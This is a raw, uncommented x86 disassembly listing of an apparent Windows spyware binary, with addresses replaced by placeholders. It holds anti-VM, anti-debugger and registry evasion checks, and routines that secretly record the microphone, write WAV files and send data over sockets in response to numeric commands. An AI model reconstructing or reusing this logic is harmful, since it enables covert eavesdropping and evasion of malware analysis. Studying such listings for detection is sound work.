sub_401000
push ebx
push esi
mov esi rw-data
push edi
push 0x1c
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push 0x1
pop ebx
cmp [ eax ] bl
jne r-xdata
push 0x1d
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
jne r-xdata
call sub_4010f1
test al al
je r-xdata
push 0x1f
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
jne r-xdata
call sub_401102
test al al
je r-xdata
push ebx
call sub_401234
pop ecx
push 0x20
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
jne r-xdata
call sub_401178
test al al
je r-xdata
push ebx
call sub_401234
pop ecx
push 0x21
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
xor edi edi
cmp [ eax ] bl
jne r-xdata
call sub_4011a3
test al al
je r-xdata
push ebx
call sub_401234
pop ecx
push 0x22
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
jne r-xdata
push edi
push edi
push edi
push r-xdata
push edi
push edi
call [ CreateThread@IAT ]
push ebx
call sub_401234
pop ecx
pop edi
pop esi
xor eax eax
pop ebx
retn
push edi
push edi
push edi
push r-xdata
push edi
push edi
call [ CreateThread@IAT ]
sub_401102
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
and [ ebp - 0x4 ] 0x0
push edx
push ecx
push ebx
mov eax 0x564d5868
mov ebx 0x0
mov ecx 0xa
mov edx 0x5658
in eax dx
cmp ebx 0x564d5868
sete [ ebp - 0x1c ]
pop ebx
pop ecx
pop edx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_401178
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
push 0x0
push r--data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
neg eax
sbb al al
inc al
leave
retn
sub_4011a3
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
add eax 0x68
mov eax [ eax ]
cmp eax 0x70
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
setne al
leave
retn
sub_401234
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi rw-data
push r--data
push 0x2f
mov ecx edi
call sub_401289
mov esi [ std::operator==@IAT ]
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push r--data
push 0x2f
mov ecx edi
call sub_401289
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
call [ exit@IAT ]
call sub_4072cf
sub_401289
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_4012b5
mov esi [ ebp + 0x8 ]
cmp eax esi
ja r-xdata
mov ecx edi
call sub_409357
shl esi 0x4
add eax esi
pop edi
pop esi
pop ebp
retn 0x4
mov ecx edi
call sub_4012c8
sub_4012c8
push ebp
mov ebp esp
sub esp 0x30
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x30 ]
push eax
call [ std::out_of_range::out_of_range@IAT ]
lea eax [ ebp - 0x30 ]
push r--data
push eax
call _CxxThrowException
sub_401384
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push 0x2
mov ecx rw-data
call sub_401a9a
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_4013c9
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push edi
movzx esi ax
movzx edi dx
shr esi 0x3
imul edi esi
mov ecx [ ebp + 0x10 ]
mov [ rw-data ] ax
imul edi ecx
shr ax 0x3
mov [ rw-data ] edi
imul eax edx
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edi
mov [ rw-data ] 0x1
fild [ ebp - 0x8 ]
mov [ rw-data ] dx
mov [ rw-data ] ecx
mov [ rw-data ] ax
mov [ rw-data ] di
fmul [ r--data ]
call _ftol
imul esi eax
push 0x30008
push edi
push sub_401528
push rw-data
push 0xffffffff
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] esi
call [ waveInOpen@IAT ]
push edi
call sub_40147c
inc edi
pop ecx
cmp edi 0x2
jb r-xdata
push [ rw-data ]
call [ waveInStart@IAT ]
pop edi
pop esi
leave
retn
sub_40147c
push ebp
mov ebp esp
push esi
push edi
push [ rw-data ]
mov edi rw-data
mov ecx edi
push [ ebp + 0x8 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0x8 ]
mov ecx edi
shl esi 0x5
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx [ rw-data ]
push 0x20
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esi + eax + 0x4 ] ecx
mov ecx [ rw-data ]
xor eax eax
mov [ esi + ecx + 0x8 ] eax
mov ecx [ rw-data ]
mov [ esi + ecx + 0xc ] eax
mov ecx [ rw-data ]
mov [ esi + ecx + 0x10 ] eax
mov ecx [ rw-data ]
mov [ esi + ecx + 0x14 ] eax
mov eax [ rw-data ]
add eax esi
push eax
push [ rw-data ]
call [ waveInPrepareHeader@IAT ]
mov eax [ rw-data ]
push 0x20
add esi eax
push esi
push [ rw-data ]
call [ waveInAddBuffer@IAT ]
pop edi
pop esi
pop ebp
retn
sub_401528
push ebp
mov ebp esp
sub esp 0x74
lea eax [ ebp - 0x1 ]
push esi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0xc ]
sub eax 0x3be
je r-xdata
and [ rw-data ] 0x0
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
leave
retn 0x14
cmp [ rw-data ] 0x1
jne r-xdata
push [ rw-data ]
mov ecx rw-data
call sub_401289
push eax
mov esi rw-data
lea eax [ ebp + 0xf ]
push esi
push eax
push 0x20
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x1 ]
push esi
push eax
push 0x12
push rw-data
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ rw-data ]
push 0x20
shl eax 0x5
add eax [ rw-data ]
push eax
push [ rw-data ]
call [ waveInUnprepareHeader@IAT ]
push [ rw-data ]
call sub_40147c
mov eax [ rw-data ]
pop ecx
test eax eax
jne r-xdata
push [ rw-data ]
call closesocket
and [ rw-data ] 0x0
push 0x0
call [ ExitThread@IAT ]
push eax
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x61
call sub_4023d9
add esp 0x18
push eax
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x61
call sub_4024bf
add esp 0x18
mov [ rw-data ] eax
jmp r-xdata
inc [ rw-data ]
cmp [ rw-data ] 0x2
jb r-xdata
sub_4016b9
push ebp
mov ebp esp
sub esp 0x18
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
imul eax ecx
mov edx eax
push ebx
imul edx [ rw-data ]
push esi
push edi
shr edx 0x3
mov [ ebp - 0x10 ] edx
push 0x8
cdq
pop esi
xor edi edi
idiv esi
push edi
push 0x80
push 0x2
push edi
push edi
push 0x40000000
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x10
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
imul eax ecx
mov [ ebp - 0x18 ] eax
add eax 0x24
mov [ ebp - 0x4 ] eax
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov esi [ WriteFile@IAT ]
lea eax [ ebp + 0x8 ]
push edi
push eax
push 0x4
push r--data
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
push 0x4
push r--data
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
push 0x4
push r--data
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push 0x2
push eax
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
push 0x2
push rw-data
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
push 0x4
push rw-data
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x10 ]
push 0x4
push eax
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x14 ]
push 0x2
push eax
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
push 0x2
push rw-data
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
push 0x4
push r--data
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x18 ]
push 0x4
push eax
push ebx
call esi
lea eax [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push ebx
call esi
push ebx
call [ CloseHandle@IAT ]
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_401814
push esi
push edi
xor edi edi
mov ecx rw-data
push edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ CreateDirectoryW@IAT ]
mov eax 0x1f40
push 0x24
mov ecx rw-data
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x8
mov [ rw-data ] eax
mov [ rw-data ] 0x1
mov [ rw-data ] di
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
imul eax eax 0x3c
mov ecx [ rw-data ]
mov [ esp ] 0x30008
imul ecx eax
movzx eax [ rw-data ]
shr eax 0x3
imul eax ecx
push edi
push sub_40193b
push rw-data
push 0xffffffff
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] eax
call [ waveInOpen@IAT ]
push [ rw-data ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi rw-data
push 0x20
push esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
call [ waveInPrepareHeader@IAT ]
push 0x20
push esi
push [ rw-data ]
call [ waveInAddBuffer@IAT ]
push [ rw-data ]
call [ waveInStart@IAT ]
pop edi
xor eax eax
pop esi
retn 0x4
sub_40193b
push ebp
mov ebp esp
sub esp 0xb8
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0xc ] 0x3c0
jne r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push esi
push eax
call [ time@IAT ]
lea eax [ ebp - 0x8 ]
push eax
call [ localtime@IAT ]
push eax
push r--data
lea eax [ ebp - 0xb8 ]
push 0x50
push eax
call [ strftime@IAT ]
add esp 0x18
lea eax [ ebp + 0xf ]
lea ecx [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x28 ]
push r--data
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_410ee4
pop ecx
pop ecx
push eax
push 0x5c
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@G@Z
add esp 0xc
push eax
lea eax [ ebp - 0x68 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x38 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x68 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi rw-data
lea ecx [ ebp - 0x18 ]
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_4016b9
pop ecx
pop ecx
push 0x20
push esi
push [ rw-data ]
call [ waveInUnprepareHeader@IAT ]
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
push 0x20
push esi
push [ rw-data ]
call [ waveInPrepareHeader@IAT ]
push 0x20
push esi
push [ rw-data ]
call [ waveInAddBuffer@IAT ]
pop esi
sub_401a9a
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov al [ eax ]
mov esi ecx
push 0x0
push edi
mov [ esi ] al
call sub_401b51
push [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x4 ] eax
push edi
push eax
call sub_401b29
mov eax [ esi + 0x4 ]
shl edi 0x4
add eax edi
pop edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0xc
sub_401ad8
push esi
mov esi ecx
push [ esi + 0x8 ]
push [ esi + 0x4 ]
call sub_401b07
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
sub ecx eax
sar ecx 0x4
push ecx
push eax
mov ecx esi
call sub_401b64
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
pop esi
retn
sub_401b07
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x8
push esi
mov ecx edi
call sub_401b88
add esi 0x10
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_401b29
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
test esi esi
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_401b74
add [ ebp + 0x8 ] 0x10
dec esi
jne r-xdata
sub_401bb0
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0x10
call sub_401bd0
pop ecx
test eax eax
pop ecx
je r-xdata
pop ebp
retn
push [ ebp + 0xc ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401be7
push ebp
mov ebp esp
push esi
mov esi ecx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_412390
pop ecx
sub_401c6a
push ebp
mov ebp esp
sub esp 0x20
push esi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp + 0xc ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41113a
mov eax esi
add esp 0x24
sub eax 0x3c
je r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
call sub_405cd4
mov esi eax
pop ecx
test esi esi
je r-xdata
dec eax
je r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401ad8
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
pop esi
leave
retn
push r--data
push esi
call sub_405f2e
push r--data
push esi
mov [ rw-data ] eax
call sub_405f2e
push r--data
push esi
mov [ rw-data ] eax
call sub_405f2e
push r--data
push esi
mov [ rw-data ] eax
call sub_405f2e
add esp 0x10
mov [ rw-data ] eax
mov ecx esp
mov [ rw-data ] 0x1
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1b
cmp [ rw-data ] 0x0
je r-xdata
dec eax
je r-xdata
jmp r-xdata
call [ rw-data ]
and [ rw-data ] 0x0
jmp r-xdata
dec eax
je r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
push [ ebp + 0x8 ]
call sub_401e3d
add esp 0xc
jmp r-xdata
call [ rw-data ]
test al al
mov [ rw-data ] al
je r-xdata
dec eax
jne r-xdata
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x41
jmp r-xdata
call [ rw-data ]
test al al
mov [ rw-data ] al
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_402062
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
mov esi eax
mov [ esp ] 0x3e8
call [ Sleep@IAT ]
push esi
push [ ebp + 0x8 ]
call sub_401e3d
pop ecx
pop ecx
call [ rw-data ]
jmp r-xdata
sub_401e3d
mov eax sub_4126ac
call _EH_prolog
sub esp 0x64
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x14 ]
call [ rw-data ]
sub esp 0xc
mov esi esp
push rw-data
mov eax rw-data
push eax
lea ecx [ ebp - 0x24 ]
push ecx
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_410e67
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x50 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x70 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push 0x60
mov ecx [ ebp + 0x8 ]
call sub_402062
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_401fab
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ esi + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
pop esi
leave
retn 0x4
mov ecx esi
call sub_401fd3
sub_401fd3
cmp [ rw-data ] 0x0
push esi
mov esi ecx
jne r-xdata
push 0x6
push 0x1
push 0x0
call socket
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
call sub_40200b
and [ esi + 0x38 ] 0x0
and [ esi + 0x39 ] 0x0
mov [ esi + 0x34 ] 0x3e8
pop esi
retn
xor al al
pop esi
retn
sub_40200b
push ebp
mov ebp esp
sub esp 0x190
lea eax [ ebp - 0x190 ]
push eax
push 0x202
call WSAStartup
neg eax
sbb al al
inc al
mov [ rw-data ] al
leave
retn
sub_402032
push ebp
mov ebp esp
push esi
lea eax [ ecx + 0x4 ]
push edi
lea esi [ ebp + 0x8 ]
mov edi eax
push 0x10
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
push [ ecx ]
movsd [ edi ] [ esi ]
call connect
pop edi
pop esi
test eax eax
jne r-xdata
call WSAGetLastError
xor al al
mov al 0x1
jmp r-xdata
pop ebp
retn 0x10
sub_402062
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
push [ ecx ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp + 0x8 ]
call sub_4023d9
add esp 0x18
lea ecx [ ebp + 0xc ]
mov esi eax
